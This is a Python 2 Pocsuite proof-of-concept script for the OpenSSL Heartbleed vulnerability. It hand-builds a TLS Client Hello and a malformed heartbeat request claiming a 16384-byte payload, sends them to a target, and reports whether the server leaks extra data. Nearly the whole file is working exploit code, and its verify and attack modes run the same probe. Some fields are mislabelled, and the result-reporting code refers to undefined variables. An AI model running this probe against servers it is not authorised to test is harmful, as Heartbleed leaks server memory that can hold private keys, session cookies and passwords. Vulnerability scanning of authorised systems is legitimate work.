#!/usr/bin/env python
# -*- coding: utf-8 -*-
 
"""
Copyright (c) 2014-2015 pocsuite developers (http://seebug.org)
See the file 'docs/COPYING' for copying permission
"""

import time
import struct
import select
import socket

#命令行
from pocsuite import pocsuite_cli
#验证模块
from pocsuite import pocsuite_verify
#攻击模块
from pocsuite import pocsuite_attack
#控制台模式
from pocsuite import pocsuite_console
from pocsuite.api.request import req
from pocsuite.api.poc import register
from pocsuite.api.poc import Output, POCBase

def h2bin(x):
    return x.replace(' ', '').replace('\n', '').decode('hex')

hello = [
    # TLSv1.1 Record Layer : HandshakeProtocol: Client Hello
    "16"  # Content Type: Handshake (22)
    "0302"  # Version: TLS 1.1 (0x0302)
    "00dc"  # Length: 220
    # Handshake Protocol: Client Hello
    "01"  # Handshake Type: Client Hello (1)
    "0000 d8"  # Length (216)
    "0302"  # Version: TLS 1.1 (0x0302)
    # Random
    "5343 5b 90"  # gmt_unix_time
    "9d9b 72 0b bc  0c bc 2b 92 a8 48 97 cf bd39 04 cc 16 0a 85 03  90 9f 77 04 33 d4de"  # random_bytes
    "00"  # Session ID Length: 0
    "0066"  # Cipher Suite Length: 102
    # Cipher Suites
    "c014"
    "c00a"
    "c022"
    "c021"
    "0039"
    "0038"
    "0088"
    "0087"
    "c00f"
    "c005"
    "0035"
    "0084"
    "c012"
    "c008"
    "c01c"
    "c01b"
    "0016"
    "0013"
    "c00d"
    "c003"
    "000a"
    "c013"
    "c009"
    "c01f"
    "c01e"
    "0033"
    "0032"
    "009a"
    "0099"
    "0045"
    "0044"
    "c00e"
    "c004"
    "002f"
    "0096"
    "0041"
    "c011"
    "c007"
    "c00c"
    "c002"
    "0005"
    "0004"
    "0015"
    "0012"
    "0009"
    "0014"
    "0011"
    "0008"
    "0006"
    "0003"
    "00ff"
    "01"  # Compression Methods
    # Compression Methods (1 method)
    "00"  # Compression Method: null
    "0049"  # Extension Length: 73
    "000b"  # Type: ec_point_formats
    "0004"  # Length: 4
    "03"  # EC point formats length: 3
    # Elliptic curves point formats
    "00"  # EC point format: uncompressed (0)
    "01"  # EC point format:ansix962_compressed_prime
    "02"  # EC point format:ansix962_compressed_char2
    # Extension: elliptic_curves
    "000a"
    "0034"
    "0032"
    "000e"
    "000d"
    "0019"
    "000b"
    "000c"
    "0018"
    "0009"
    "000a"
    "0016"
    "0017"
    "0008"
    "0006"
    "0007"
    "0014"
    "0015"
    "0004"
    "0005"
    "0012"
    "0013"
    "0001"
    "0002"
    "0003"
    "000f"
    "0010"
    "0011"
    "0023 00 00"  # Extension:SeesionTicket TLS
    "000f 00 01 01"  # Extension:Heartbeat
]

# ---------TLSv1---[Heartbeat Request]------------
hb = [
            # TLSv1.1 Record Layer: HeartbeatRequest
    "18"    # Content Type: Heartbeat (24) ----(0x18)
    "0302"  # Version: TLS 1.1 (0x0302)
    "0003"  # Heartbeat Message:
    "01"    # Type: Request (1) (0x01)
    "2000"  # Payload Length: (16384) (0x4000)
]

hello = hello[0].replace("", "").replace("\n", "")
hb = hb[0].replace("", "").replace("\n", "")

def hexdump(s):
    for b in xrange(0, len(s), 16):
        lin = [c for c in s[b: b + 16]]
        hxdat = ' '.join('%02X' % ord(c) for c in lin)
        pdat = ''.join((c if 32 <= ord(c) <= 126 else '.') for c in lin)
        # print ' %04x: %-48s %s' % (b, hxdat, pdat)

def recvall(s, length, timeout=5):
    endtime = time.time() + timeout
    rdata = ''
    remain = length
    while remain > 0:
        rtime = endtime - time.time()
        if rtime < 0:
            return None
        r, w, e = select.select([s], [], [], 5)
        # print 'read: ', r
        if s in r:
            data = s.recv(remain)

            # EOF?
            if not data:
                return None
            rdata += data
            remain -= len(data)
    hexdump(rdata)
    return rdata

def recvmsg(s):
    hdr = recvall(s, 5)  # recvall(s, 5, timeout=5)
    if hdr is None:
        return None, None, None
    # C     ---- [big-edition] + [unsigned char] + [unsigned short] + [unsigned short]
    # Python ---- [big-edition] + integer +integer + integer
    # [Content Type] + [Version] + [Length]
    typ, ver, ln = struct.unpack('>BHH', hdr)
    pay = recvall(s, ln, 10)
    if pay is None:
        return None, None, None
    return typ, ver, pay

def hit_hb(s, target):
# global target
    s.send(h2bin(hb))
    while True:
        print "[+] receive data..."
        typ, ver, pay = recvmsg(s)
        if typ is None:
            print "[-] %s |NOTVULNERABLE" % target
            return False

        # TLSv1.1 Record Layer: EncryptedHeartbeat
        # Content Type: Heartbeat (24)
        # Version: TLS 1.1 (0x0302)
        # Length: 19
        # Encrypted Heartbeat Message
        if typ == 24:
            if len(pay) > 3:
                print "[*] %s |VULNERABLE" % target
                return "check"
            else:
                print "[-] %s |NOTVULNERABLE" % target
                return True
        if typ == 21:
            print "[-] %s |NOTVULNERABLE" % target
            return False

def ssltest(target, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target, port))
    s.send(h2bin(hello))

    while True:
        typ, ver, pay = recvmsg(s)
        if typ == None:
            return
        # Look for server hello done message.
        # typ == 22 ----> Handshake
        #
        if typ == 22 and ord(pay[0]) == 0x0E:
            break

    # sys.stdout.flush()
    # print "[+] send payload: %s" % hb
    s.send(h2bin(hb))  # Malformed Packet
    return hit_hb(s, target)  # ------------- ********* 
 
class OpensslPOC(POCBase):
    vulID = '20'  # ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0
    version = '1' #默认为1
    vulDate = '2014-04-01' #漏洞公开的时间,不知道就写今天
 
    author = 'chenran' #  PoC作者的大名
    createDate = '2017-12-12'# 编写 PoC 的日期
    updateDate = '2017-12-12'# PoC 更新的时间,默认和编写时间一样
    references = 'https://www.cnblogs.com/KevinGeorge/p/8029947.html'# 漏洞地址来源,0day不用写
    name = 'opssl Heart-Blood'# PoC 名称
    appPowerLink = 'https://www.openssl.org/'# 漏洞厂商主页地址
    appName = 'openSSL'# 漏洞应用名称
    appVersion = '1.0.1'# 漏洞影响版本
    vulType = 'weak-pass'#漏洞类型,类型参考见 漏洞类型规范表
    desc = '''
        openSSL心脏滴血漏洞
    ''' # 漏洞简要描述
    samples = []# 测试样列,就是用 PoC 测试成功的网站
    install_requires = [] # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
    cvss = u"中危" #严重,高危,中危,低危
 
    #验证漏洞 pocsuite -r 20-openssl-access.py -u 10.1.5.26 --verify
    def _verify(self):
        #定义返回结果
        result = {}
        #获取漏洞url
        vul_url = '%s' % self.url
 
        #如果设置端口则取端口,没有设置则为默认端口
        import re
        from pocsuite.lib.utils.funs import url2ip
        _port = re.findall(':(\d+)\s*', vul_url)
        if len(_port) != 0:
            _host = url2ip(vul_url)[0]
            _port = url2ip(vul_url)[1]
        else :
            _host = url2ip(vul_url)
            _port = 443
 
        #s = socket.socket()
        #socket.setdefaulttimeout(1)
        #检测漏洞
        try:
            ret = ssltest(_host,_port)
            # print ret
            if ret == "check":
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = host
                result['VerifyInfo']['Payload'] = payload
            else:
                pass
        except:
            pass
        print '[+]20 poc done'
        return self.save_output(result)
 
    #漏洞攻击
    def _attack(self):
        result = {}
        # 攻击代码
        return self._verify()
 
    def save_output(self, result):
        #判断有无结果并输出
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail()
        return output
 
register(OpensslPOC)

